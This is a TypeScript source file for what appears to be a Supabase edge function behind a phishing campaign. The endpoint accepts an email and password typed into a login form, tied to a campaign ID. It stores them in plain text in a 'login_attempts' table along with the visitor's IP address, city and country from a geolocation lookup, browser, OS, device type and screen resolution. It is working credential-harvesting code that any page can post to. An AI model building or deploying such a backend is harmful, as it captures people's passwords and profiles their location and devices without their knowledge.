import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { campaign_id, entered_email, entered_password, screen_resolution, user_agent } =
      await req.json();

    if (!campaign_id) {
      return new Response(
        JSON.stringify({ error: "campaign_id is required" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Parse user agent for browser/OS/device
    const ua = user_agent || req.headers.get("user-agent") || "";
    const browser = parseBrowser(ua);
    const os = parseOS(ua);
    const device_type = parseDeviceType(ua);

    // Get IP from headers
    const ip_address =
      req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("cf-connecting-ip") ||
      "unknown";

    // Geolocation lookup
    let city = "";
    let country = "";
    try {
      if (ip_address && ip_address !== "unknown" && ip_address !== "127.0.0.1") {
        const geoRes = await fetch(`http://ip-api.com/json/${ip_address}?fields=city,country`);
        if (geoRes.ok) {
          const geo = await geoRes.json();
          city = geo.city || "";
          country = geo.country || "";
        }
      }
    } catch {
      // Geolocation is best-effort
    }

    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
    );

    const { error } = await supabase.from("login_attempts").insert({
      campaign_id,
      entered_email: entered_email || "",
      entered_password: entered_password || "",
      ip_address,
      city,
      country,
      browser,
      os,
      device_type,
      screen_resolution: screen_resolution || "",
      user_agent: ua,
    });

    if (error) {
      return new Response(
        JSON.stringify({ error: error.message }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    return new Response(
      JSON.stringify({ success: true }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ error: "Internal server error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});

function parseBrowser(ua: string): string {
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Edg")) return "Edge";
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Safari")) return "Safari";
  if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
  return "Other";
}

function parseOS(ua: string): string {
  if (ua.includes("Windows")) return "Windows";
  if (ua.includes("Mac OS")) return "macOS";
  if (ua.includes("Linux")) return "Linux";
  if (ua.includes("Android")) return "Android";
  if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
  return "Other";
}

function parseDeviceType(ua: string): string {
  if (ua.includes("Mobile") || ua.includes("Android")) return "Mobile";
  if (ua.includes("Tablet") || ua.includes("iPad")) return "Tablet";
  return "Desktop";
}
